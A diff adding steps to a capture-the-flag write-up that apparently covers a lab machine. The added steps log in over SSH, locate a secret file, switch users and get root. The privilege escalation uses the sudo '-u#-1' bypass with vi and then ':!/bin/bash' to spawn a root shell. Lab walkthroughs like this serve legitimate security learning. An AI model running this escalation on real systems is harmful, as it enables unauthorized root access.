@@ -125,6 +125,37 @@ get Eli's_Creds.txt
 ssh <username from brainfuck execution>@<IP>
 ```
 ![rabbit ssh login](https://user-images.githubusercontent.com/112984045/200711363-8062ba83-b659-4c0c-92b5-3f1302550815.png)
+<br>
 
+` look at the msg given to gwendoline from root. His is talking about a file 's3cr3t'.` <br>
+` move to home directory and search for s3cr3t`
+```bash
+locate s3cr3t
+```
+![rabbit ssh secret](https://user-images.githubusercontent.com/112984045/200848335-8d3529c5-945b-4c0a-80b1-54a491112433.png)
+<br>
 
+```bash
+su gwendoline
+```
+`look for user.txt and submit the flag`
+![rabbit usrflag](https://user-images.githubusercontent.com/112984045/200849217-99aec744-f0a5-4196-b468-af46f3fe5bb8.png)
+<br>
 
+## PRIVILEGE ESCALATION
+
+```bash
+sudo -l
+```
+* the user gwendoline has rights to execute vi command but not as root.
+```bash
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+```
+* use the command `:!/bin/bash` in the editor.
+![rabbit root](https://user-images.githubusercontent.com/112984045/200851195-4b9b99f2-97a8-4558-ac5d-c84d3ad346de.png)
+
+### ` do submit the flag to complete the task`
+
+<br>
+
+### FOR ANY DOUBTS OR SUGGESTIONS DO WRITE TO shy.bu9@gmail.com
